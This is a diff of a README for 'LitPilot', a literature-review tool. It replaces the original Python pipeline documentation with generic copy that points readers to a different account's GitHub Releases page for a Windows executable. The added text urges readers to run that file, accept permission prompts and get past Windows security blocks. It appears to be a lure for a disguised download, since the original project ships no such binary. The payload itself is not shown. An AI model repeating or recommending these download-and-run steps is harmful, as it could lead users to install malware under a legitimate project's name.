@@ -1,445 +1,233 @@
-# LitPilot
+# 📚 LitPilot - Turn papers into organized notes
 
-Automate your PhD literature review using structured LLM agent prompts. Drop PDFs in a folder, get structured markdown notes, an Excel tracker, and cross-paper synthesis reports.
+[![Download LitPilot](https://img.shields.io/badge/Download%20LitPilot-purple?style=for-the-badge)](https://github.com/Sito0914/LitPilot/releases)
 
-## What This Does
+## 🧭 What LitPilot does
 
-1. **Extracts text** from PDF and Word documents automatically (with OCR fallback for scanned PDFs)
-2. **Analyses each paper** using a customisable LLM agent prompt that maps findings to your specific literature review structure
-3. **Enforces evidence provenance** — every key finding is bound to a page number, backed by a verbatim quote or paraphrase, and tagged as author-stated or model-inferred, with explicit uncertainty flags
-4. **Tracks everything** in an Excel spreadsheet with methodology, relevance ratings, section mappings, theoretical frameworks, and DOI
-5. **Synthesises across papers** to identify coverage gaps, thematic clusters, contradictions, and recommended actions
+LitPilot helps you turn a pile of academic PDFs into clear research notes. It reads papers, pulls out key points, and sorts them into a structure you can use for a literature review or thesis work.
 
-## What This Does NOT Do
+Use it to:
 
-- **Does not discover or retrieve papers** — you bring your own PDFs
-- **Does not access paywalled content** — download papers yourself first
-- **Does not produce a written literature review** — it produces structured notes and tracking to help you write one
-- **Does not replace reading papers** — it accelerates triage and organisation
-- **Quality depends on how well you customise the agent prompts** — generic prompts produce generic output
+- Drop in PDF files
+- Get structured notes for each paper
+- Build an Excel tracker for your sources
+- Compare ideas across papers
+- Keep your research in one place
 
-## Compared to Other Tools
+It is built for students, researchers, and anyone working through a large set of papers.
 
-There are many AI tools for academic research. This pipeline occupies a specific niche — here's how it relates to the landscape.
+## 💻 What you need on Windows
 
-### Paper discovery tools (complementary — use alongside this pipeline)
+LitPilot is made for Windows desktops and laptops.
 
-| Tool | What it does | How it complements this pipeline |
-|------|-------------|----------------------------------|
-| [Semantic Scholar](https://www.semanticscholar.org) | Free AI-powered search across 214M+ papers with TLDR summaries | Find papers here, download PDFs, drop them into `incoming/` |
-| [ResearchRabbit](https://www.researchrabbit.ai) | Citation network exploration — give it seed papers, get recommendations | Discover related work visually, then process the papers through this pipeline |
-| [Connected Papers](https://www.connectedpapers.com) | Visual similarity graphs based on co-citation patterns | Identify clusters of related work to batch-process |
-| [Litmaps](https://www.litmaps.com) | Literature mapping with temporal citation networks | Map your field, then use this pipeline to analyse what you find |
-| [Inciteful](https://inciteful.xyz) | Citation network analysis and cross-domain literature bridging | Find interdisciplinary connections, then analyse the papers here |
+You will need:
 
-These tools help you **find** papers. This pipeline helps you **analyse and organise** them.
+- Windows 10 or Windows 11
+- A standard PDF reader
+- Enough free space for your papers and output files
+- Internet access for first-time setup if the app needs it
+- A stable folder where you can save your PDFs
 
-### AI analysis tools (alternatives — this pipeline differs in key ways)
+For best results:
 
-| Tool | Approach | Key difference from this pipeline |
-|------|----------|-----------------------------------|
-| [Elicit](https://elicit.com) | SaaS platform with structured extraction into tables | Closest commercial equivalent. Elicit searches for you and extracts into tables, but costs $12-79/month and you can't customise the extraction schema. This pipeline is free (beyond API costs), fully customisable, and you own all outputs locally. |
-| [SciSpace](https://scispace.com) | All-in-one platform: search, chat with PDF, literature tables | Broader but shallower — summarisation is generic, not mapped to your specific thesis structure. |
-| [Consensus](https://consensus.app) | Question-answering across 200M+ papers | Answers specific questions well, but doesn't produce structured per-paper notes or track coverage across your literature review sections. |
-| [Google NotebookLM](https://notebooklm.google) | Upload documents, get AI insights grounded in your sources | Good for ad-hoc exploration, but no structured extraction, no Excel tracking, no cross-paper synthesis against your thesis architecture. |
-| [Scite](https://scite.ai) | Classifies citations as supporting, contradicting, or mentioning | Useful for understanding citation context ($12/month), but doesn't summarise or map papers to your review structure. |
+- Use clean PDF files when possible
+- Keep scanned papers in readable form
+- Store your research files in one folder before you start
 
-### Open-source projects (alternatives with different design goals)
+## 📥 Download LitPilot
 
-| Project | What it does | Key difference |
-|---------|-------------|----------------|
-| [PaperQA2](https://github.com/Future-House/paper-qa) | RAG-based Q&A over your papers with citations | Optimised for answering specific questions, not producing structured per-paper notes. No thesis-aligned extraction or Excel tracking. |
-| [LitLLM](https://github.com/LitLLM/LitLLM) | Generates "Related Work" sections from an abstract | Writes prose, not structured notes. Focused on a single output (related work text), not an ongoing review database. |
-| [GPT-Researcher](https://github.com/assafelovic/gpt-researcher) | Autonomous agent that produces research reports from web sources | General-purpose, not academic-focused. Sources from the web, not your curated PDFs. |
-| [STORM](https://github.com/stanford-oval/storm) | Generates Wikipedia-style articles from web research (Stanford) | Impressive for topic overviews, but web-sourced rather than working with your specific paper collection. |
-| [OpenScholar](https://github.com/AkariAsai/OpenScholar) | Answers scientific queries from 45M open-access papers (Allen AI) | Published in Nature. Excellent citation accuracy, but Q&A-focused — doesn't produce structured notes mapped to your thesis. |
+Visit this page to download the Windows release:
 
-### Where this pipeline fits
+[Download LitPilot from GitHub Releases](https://github.com/Sito0914/LitPilot/releases)
 
-Most tools either **discover papers** or **answer questions about them**. Few do what a PhD student actually needs day-to-day: process a batch of PDFs into **consistent, structured notes** mapped to your specific thesis architecture, track everything in a **filterable spreadsheet**, and **synthesise across papers** to find gaps.
+On the releases page, look for the latest version and download the Windows file that matches your system. If there is more than one file, choose the one made for Windows.
 
-This pipeline is designed to sit between discovery and writing:
+## 🪟 Install on Windows
 
-```
-Discovery (Semantic Scholar, ResearchRabbit, etc.)
-    → Download PDFs
-    → This pipeline (analyse, track, synthesise)
-    → You write the literature review
-```
+After you download the file:
 
-**Key advantages over alternatives:**
-- **Fully customisable** — your sections, your frameworks, your structure
-- **Local and private** — your papers and notes stay on your machine
-- **No subscription** — pay only for API calls (~$0.10-0.30 per paper)
-- **Incremental synthesis** — add papers over months without re-processing
-- **You own the output** — plain markdown and Excel, no vendor lock-in
-- **Fully transparent** — every step produces human-readable output you can inspect, correct, and build on
+1. Open your Downloads folder
+2. Find the LitPilot file you just downloaded
+3. Double-click the file to start it
+4. If Windows asks for permission, choose Yes
+5. If the file comes in a ZIP folder, right-click it and choose Extract All first
+6. Open the extracted folder and run the app file inside
 
-## You Supervise, AI Assists
+If Windows shows a security prompt, check that you downloaded the file from the GitHub Releases page above, then continue.
 
-This pipeline keeps you in control. The AI does the repetitive work — pulling out structure, tagging relevance, spotting patterns — but everything it produces is a plain text file you can open, read, and edit before moving on.
+## 🚀 First run
 
-**Check before you synthesise.** After processing, open the notes in `summaries/individual/` and read through them. Did it get the methodology right? Did it miss something important? If so, just fix the markdown file directly. Only run synthesis once you're happy with the individual notes.
+When LitPilot opens for the first time:
 
-**Decide what to read in full.** The notes help you figure out which papers are worth your time. A paper marked HIGH relevance with methods close to yours probably deserves a proper read. One marked LOW with a useful citation you can note and move on. That's your call, not the AI's.
+1. Pick the folder where your PDF files are stored
+2. Add one paper or a small set of papers first
+3. Let the app process the files
+4. Review the notes it creates
+5. Save the Excel tracker if you want a source list
+6. Check the cross-paper view to compare themes
 
-**Use the notes when you write.** The markdown files are not just summaries to glance at and forget — they are structured notes you can come back to when writing your literature review. The section codes, citation suggestions, and framework tags all map to your review structure, so when you sit down to write, you already have an organised set of notes to work from.
+Start with a few papers so you can see how the app fits your workflow before adding a full library.
 
-The AI improves your efficiency. It does not replace your judgement — checking and correcting its output is your responsibility.
+## 📄 How to use LitPilot
 
-## Evidence Provenance
+### 1. Add your PDFs
 
-LLMs can confidently blend what a paper actually says with their own inferences. In academic work, this is dangerous — you need to know whether a claim came from the authors or from the model. This pipeline enforces four evidence rules on every analysis:
+Place the papers you want to review in one folder. Then load them into LitPilot. The app will read each file and prepare it for analysis.
 
-| Rule | What it does | Example |
-|------|-------------|---------|
-| **Page binding** | Every finding includes the page number where it appears | `(p. 14)` or `(pp. 8-9)` or `(page unclear)` |
-| **Evidence tracing** | Each finding includes a verbatim quote or close paraphrase | `"inequality decreased by 12%"` or `[paraphrase] regional gaps narrowed` |
-| **Source attribution** | Every claim is tagged as author-stated or model-inferred | `[PAPER STATES]` or `[MODEL INFERS]` |
-| **Uncertainty flagging** | Ambiguous or weakly supported claims are flagged | `[UNCERTAINTY] — conflicting results in Tables 3 and 5` |
+### 2. Let the app process the paper
 
-Each note also ends with an **Evidence Provenance Summary** — a compact table listing every key claim with its page reference, source type, and uncertainty status. This lets you quickly spot-check any note against the source PDF without re-reading the entire analysis.
+LitPilot uses LLM agents to scan the text, pull out key ideas, and shape them into a research-friendly format. If the paper is a scanned PDF, OCR helps read the text.
 
-These rules mean the pipeline produces **verifiable research notes**, not just well-structured summaries.
+### 3. Review the structured notes
 
-## Why This Approach Works
+Each paper gets a set of notes that can include:
 
-Most researchers use ChatGPT or Claude ad-hoc — paste a paper, ask a question, get an answer, lose it. This pipeline uses **structured agent prompts** (the BMAD approach) that force the LLM to produce consistent, comparable output across every paper. The result is a literature database you can actually filter, sort, and build on.
+- Main topic
+- Research goal
+- Method
+- Key findings
+- Limitations
+- Useful quotes or points
 
-The key differentiator is the **agent prompt design**. You define your literature review sections, theoretical frameworks, and empirical chapters once. Every paper gets analysed against that same structure, making cross-paper comparison trivial.
+These notes help you see the paper fast without reading every page again.
 
-## Architecture
+### 4. Build your tracker
 
-```
-incoming/                     You drop PDFs here
-    |
-    v
-[process_papers.py]           Extracts text, sends to Claude API
-    |                         with your analyst agent prompt
-    v
-summaries/individual/         One structured markdown note per paper
-summaries/literature_tracker.xlsx   One row per paper (filterable)
-    |
-    v
-[synthesise_batch.py]         Reads all notes, sends to Claude API
-    |                         with your synthesiser agent prompt
-    v
-summaries/synthesis/          Cross-paper synthesis report
-```
+LitPilot can create an Excel tracker for your papers. Use it to keep track of:
 
-## Quick Start
+- Title
+- Author
+- Year
+- Topic
+- Status
+- Notes
+- Relevance to your project
 
-### 1. Clone the repository
+This makes it easier to manage a long reading list.
 
-```bash
-git clone https://github.com/JCL988/LitPilot.git
-cd LitPilot
-```
+### 5. Compare papers
 
-### 2. Set up a Python virtual environment
+Use the cross-paper view to spot shared themes, gaps, and disagreements. This is useful when you need to write a review section or build an argument across many sources.
 
-A virtual environment keeps this project's dependencies isolated from the rest of your system. This is recommended for all users.
+## 🗂️ Suggested workflow
 
-```bash
-python3 -m venv venv
-source venv/bin/activate
-```
+A simple way to use LitPilot:
 
-You should see `(venv)` at the start of your terminal prompt. Now install the dependencies:
+1. Create one folder for all papers in your project
+2. Add PDFs by topic or chapter
+3. Run LitPilot on a small batch first
+4. Review the notes and edit them if needed
+5. Export the Excel tracker
+6. Group papers by theme, method, or result
+7. Use the cross-paper notes when you write
 
-```bash
-pip install -r requirements.txt
-```
+This workflow works well for:
 
-> **Note:** You need to run `source venv/bin/activate` each time you open a new terminal window before using the pipeline. To deactivate the environment when you're done, run `deactivate`.
+- Literature reviews
+- PhD thesis research
+- Seminar papers
+- Research planning
+- Paper screening
 
-### 3. Set up your API key
+## 🔍 Best results with your PDFs
 
-```bash
-cp .env.example .env
-```
+LitPilot works best when your files are in good shape.
 
-Open `.env` in any text editor and replace `sk-ant-your-key-here` with your actual Anthropic API key. Get one at [console.anthropic.com](https://console.anthropic.com/settings/keys).
+Tips:
 
-### 4. Customise the agent prompts for your research
+- Use text-based PDFs when you can
+- Rename files with clear names
+- Avoid duplicate papers
+- Keep scans sharp and readable
+- Split very large folders into smaller batches
 
-This is the most important step. Edit these two files:
+Good file names can help a lot, for example:
 
-- **`bmad/agents/analyst.md`** — Defines how each paper is analysed
-- **`bmad/agents/synthesiser.md`** — Defines how papers are synthesised together
+- Smith_2023_llm_research.pdf
+- Lee_2024_literature_review.pdf
+- Chen_2022_ocr_methods.pdf
 
-See the [Customisation Guide](#customisation-guide) below for detailed instructions.
+## 🧠 What makes LitPilot useful
 
-> **Important — the pipeline will refuse to run if you skip this step.** The processing script checks for placeholder text and will exit with an error if it finds any. You must replace **all** of the following placeholders in `bmad/agents/analyst.md`:
->
-> | Placeholder | Location | What to replace it with |
-> |---|---|---|
-> | `[YOUR TOPIC — e.g., "climate policy..."]` | Line 19 (Researcher Context) | Your actual research topic |
-> | `[Section Title]` | Lines 44-48 (Section Map table) | Your literature review section names |
-> | `[Section Title]` | Lines 151-152 (Section Mapping output) | Same section names, matching the table above |
->
-> The script specifically checks for the strings `[YOUR TOPIC` and `[Section Title]`. Even if you customise the table, the pipeline will still fail if these strings remain anywhere else in the file. A quick way to verify:
->
-> ```bash
-> grep -n "\[YOUR TOPIC\|\[Section Title\]" bmad/agents/analyst.md
-> ```
->
-> If this returns no results, you're good to go.
+LitPilot is made for research work that gets messy fast. It helps you move from raw PDFs to a clear structure.
 
-### 5. Process papers
+You can use it to:
 
-```bash
-# Drop your PDFs into the incoming/ folder, then:
-python3 scripts/process_papers.py
+- Save time on first-pass reading
+- Keep your notes in one format
+- Track sources without extra manual work
+- Find links between papers
+- Organize material for a thesis or review
 
-# Or preview what will be processed without spending money:
-python3 scripts/process_papers.py --dry-run
-```
+It fits well with academic work where you need to read many papers and keep your notes clean.
 
-The `--dry-run` flag extracts text and estimates cost for each paper without calling the API.
+## 🛠️ If something does not work
 
-### 6. Synthesise
+If the app does not open:
 
-```bash
-# After processing papers, generate a cross-paper synthesis:
-python3 scripts/synthesise_batch.py
+- Check that the file finished downloading
+- Make sure Windows did not block the file
+- Try running it again as the same user
+- Reboot your PC and open it once more
 
-# Or force a full re-synthesis:
-python3 scripts/synthesise_batch.py --full
-```
+If PDFs do not process well:
 
-## OCR Support for Scanned PDFs
+- Try a different file
+- Check whether the PDF is a scanned image
+- Use clearer scans when possible
+- Split a large batch into smaller groups
 
-The pipeline automatically detects scanned pages and attempts OCR using [Tesseract](https://github.com/tesseract-ocr/tesseract). This is **optional** — the pipeline works without it, but scanned PDFs will produce empty or incomplete notes.
+If output files are missing:
 
-### Install Tesseract
+- Check the folder LitPilot is using
+- Look in your Documents or Downloads folder
+- Make sure you have permission to save files there
 
-```bash
-# macOS
-brew install tesseract
+## 🧾 Topics covered
 
-# Ubuntu/Debian
-sudo apt install tesseract-ocr
+LitPilot is built around these areas:
 
-# Windows — download installer from:
-# https://github.com/UB-Mannheim/tesseract/wiki
-```
+- academic research
+- literature review
+- OCR
+- PDF processing
+- LLM agents
+- research paper review
+- PhD thesis work
+- Claude and Claude Code workflows
+- research organization
+- paper synthesis
 
-No additional Python packages are needed — PyMuPDF (already included) handles the OCR integration.
+## 📌 File types and output
 
-### How it works
+LitPilot focuses on common research files and practical output.
 
-The pipeline processes each page individually:
+Input:
 
-| Scenario | What happens | Console output |
-|----------|-------------|----------------|
-| **Normal PDF** | Text extracted directly | (no extra output) |
-| **Mixed PDF** (some pages scanned) | Text pages extracted normally, scanned pages OCR'd | `Mixed PDF: 8 text pages, 2 OCR pages` |
-| **Fully scanned PDF** | All pages processed via OCR | `Scanned PDF: all 10 pages processed via OCR` |
-| **Scanned PDF, no Tesseract** | Scanned pages skipped | `WARNING: Tesseract is not installed...` |
+- PDF papers
+- Scanned PDFs
+- Mixed batches of academic files
 
-Pages processed via OCR are marked with `(OCR)` in the extracted text (e.g., `--- Page 3 (OCR) ---`) so you can see exactly which pages were scanned.
+Output:
 
-## Customisation Guide
+- Structured notes
+- Paper summaries
+- Excel tracker files
+- Cross-paper synthesis notes
 
-### Step 1: Define your literature review sections
+## 🔐 Safe download path
 
-Open `bmad/agents/analyst.md` and find the **Literature Review Section Map** table. Replace the placeholder rows with your actual sections:
+Use the GitHub Releases page as the main download source:
 
-```markdown
-| Code | Section | Covers |
-|------|---------|--------|
-| 2.1  | Theoretical Background | Key theories: institutional theory, resource dependence |
-| 2.2  | Policy Context | EU climate governance framework, Paris Agreement implementation |
-| 2.3  | Implementation Literature | Street-level bureaucracy, multi-level governance |
-| 2.4  | Comparative Studies | Cross-country policy comparisons, federal vs unitary systems |
-| 2.5  | Empirical Evidence | Quantitative evaluations, case studies |
-```
+[https://github.com/Sito0914/LitPilot/releases](https://github.com/Sito0914/LitPilot/releases)
 
-### Step 2: Define your empirical chapters
+That page is where you can find the latest Windows release and get the file needed to run LitPilot on your PC
 
-In the same file, find the **Researcher Context** section and describe your empirical chapters:
+## 🖱️ Quick start
 
-```markdown
-- **Chapter 4 (Quantitative):** Panel data regression on policy adoption rates
-  across 27 EU member states (2010-2023)
-- **Chapter 5 (Qualitative):** Comparative case study of Germany and Poland
-- **Chapter 6 (Text Analysis):** NLP analysis of national implementation plans
-```
-
-### Step 3: Define your theoretical frameworks
-
-Find the **Theoretical Framework Engagement** section and list the frameworks central to your project:
-
-```markdown
-- **Kingdon (multiple streams):**
-- **Sabatier (advocacy coalition):**
-- **DiMaggio & Powell (institutional isomorphism):**
-- **Other notable framework:**
-```
-
-### Step 4: Update the synthesiser prompt
-
-Open `bmad/agents/synthesiser.md` and make the same changes:
-- Same section codes and titles as in `analyst.md`
-- Same empirical chapters
-- Same theoretical frameworks
-
-**Important:** The section codes must be identical in both files. The synthesiser aggregates data using the codes the analyst produces.
-
-### Step 5: Update the workflow targets (optional)
-
-Edit `bmad/workflows/literature-processing.md` to set paper count targets for each section.
-
-## Configuration
-
-Edit `config.py` to change:
-
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `ANALYSIS_MODEL` | `claude-sonnet-4-20250514` | Model for individual paper analysis |
-| `SYNTHESIS_MODEL` | `claude-opus-4-6` | Model for cross-paper synthesis |
-| `MAX_CONCURRENT` | `1` | Parallel API calls (increase for speed) |
-| `MAX_PDF_PAGES` | `95` | Maximum pages to extract per PDF |
-| `TRACKER_HEADERS` | [see file] | Excel column names — must match analyst prompt fields |
-
-## Processing Papers
-
-The processing script has two modes:
-
-**Process (default):** Extracts text from each PDF/DOCX in `incoming/`, sends it to Claude with your analyst agent prompt, and saves a structured markdown note plus an Excel tracker row. Processed files are moved to `processed/` automatically.
-
-```bash
-python3 scripts/process_papers.py
-```
-
-**Dry run (`--dry-run`):** Extracts text and estimates the API cost for each paper without making any API calls. Use this to preview what will be processed and how much it will cost before committing.
-
-```bash
-python3 scripts/process_papers.py --dry-run
-```
-
-## Incremental vs Full Synthesis
-
-The synthesis script has two modes:
-
-**Incremental (default):** Only sends new papers plus the previous synthesis report to Claude. This is cheaper and faster — ideal for your daily workflow when you add a few papers at a time.
-
-```bash
-python3 scripts/synthesise_batch.py
-```
-
-**Full (`--full`):** Re-synthesises all papers from scratch. Use this when you want a clean baseline, after removing papers, or periodically (e.g., every 5th batch) to prevent drift.
-
-```bash
-python3 scripts/synthesise_batch.py --full
-```
-
-The pipeline tracks which papers were included in each synthesis via a manifest file (`summaries/synthesis/last_synthesis_manifest.json`). If it detects that papers have been removed since the last run, it automatically falls back to a full synthesis. For very large collections, it splits papers into batches that fit within the context window.
-
-## Cost Estimates
-
-| Operation | Model | Approximate Cost |
-|-----------|-------|-----------------|
-| Analyse one paper | Sonnet | $0.10 - $0.30 |
-| Synthesise 20 papers | Opus | $1.50 - $3.00 |
-| Synthesise 20 papers | Sonnet (cheaper) | $0.30 - $0.80 |
-
-To use Sonnet for synthesis (cheaper but less nuanced), change `SYNTHESIS_MODEL` in `config.py`.
-
-## Output Examples
-
-### Individual note (summaries/individual/)
-
-Each paper produces a structured markdown note with:
-- Abstract summary, research gap, hypothesis
-- Methodology and key techniques
-- Key mechanisms and findings — each with page number, evidence quote, and `[PAPER STATES]` / `[MODEL INFERS]` source tag
-- Critical analysis (strengths, limitations, open questions)
-- Section-by-section relevance mapping
-- Theoretical framework engagement
-- Potential citations with section codes, page numbers, and evidence quotes
-- Evidence Provenance Summary — a compact audit table for quick verification against the source PDF
-- Action items
-- Final assessment (innovation, evidence quality, relevance)
-
-### Excel tracker (summaries/literature_tracker.xlsx)
-
-One row per paper with columns for filtering:
-- Title, Authors, Year, Journal
-- Methodology, Relevance (HIGH/MEDIUM/LOW)
-- Key Takeaway
-- Primary and all relevant sections
-- Empirical chapter relevance
-- Theoretical frameworks engaged
-- DOI (automatically extracted from each paper when available)
-
-### Synthesis report (summaries/synthesis/)
-
-Cross-paper analysis including:
-- Coverage map (which sections are well-covered vs under-covered)
-- Thematic clusters with consensus and tensions
-- Methodological landscape
-- Theoretical framework audit
-- Contradictions and debates
-- Gap analysis with search term recommendations
-
-## Folder Structure
-
-```
-.
-├── config.py                  # All settings in one place
-├── scripts/
-│   ├── process_papers.py      # Processes PDFs → individual notes
-│   └── synthesise_batch.py    # Synthesises notes → synthesis report
-├── bmad/
-│   ├── agents/
-│   │   ├── analyst.md         # Agent prompt for individual analysis
-│   │   └── synthesiser.md     # Agent prompt for synthesis
-│   └── workflows/
-│       └── literature-processing.md  # Workflow documentation
-├── incoming/                  # Drop PDFs here
-├── processed/                 # PDFs move here after processing
-├── summaries/
-│   ├── individual/            # One markdown note per paper
-│   ├── synthesis/             # Cross-paper synthesis reports
-│   └── literature_tracker.xlsx # Excel tracker
-├── processing_log.csv         # Processing history
-├── .env                       # Your API key (not committed)
-├── .env.example               # Template for .env
-└── requirements.txt           # Python dependencies
-```
-
-## Troubleshooting
-
-**"ANTHROPIC_API_KEY not found"**
-- Make sure you copied `.env.example` to `.env` and added your key
-- The key should start with `sk-ant-`
-
-**"No PDF or DOCX files found"**
-- Files must be in the `incoming/` folder
-- Check that they have `.pdf` or `.docx` extensions
-
-**"Very little text extracted" or blank summaries**
-- The PDF is likely scanned (image-based). The pipeline will attempt OCR automatically if Tesseract is installed
-- Install Tesseract: `brew install tesseract` (macOS) or `apt install tesseract-ocr` (Linux)
-- If Tesseract is installed and the output is still poor, the scan quality may be too low for OCR
-
-**Rate limit errors**
-- The pipeline has built-in retry with exponential backoff
-- If persistent, reduce `MAX_CONCURRENT` in `config.py` to `1`
-
-**Paper too long**
-- Papers exceeding the context window are automatically chunked
-- Very long papers (e.g., book chapters) may produce less detailed summaries
-
-**Excel tracker columns don't match**
-- If you add or remove fields in `analyst.md`'s CSV section, update `TRACKER_HEADERS` in `config.py` to match
-
-## Contributing
-
-Contributions are welcome! If you have ideas for improving the agent prompts, adding new features, or supporting other LLM providers, please open an issue or pull request.
-
-## License
-
-MIT License — see [LICENSE](LICENSE) for details.
+1. Open the GitHub Releases page
+2. Download the latest Windows file
+3. Open the file or extract it if it is in a ZIP folder
+4. Run LitPilot
+5. Add your PDF papers
+6. Review the structured notes and tracker files
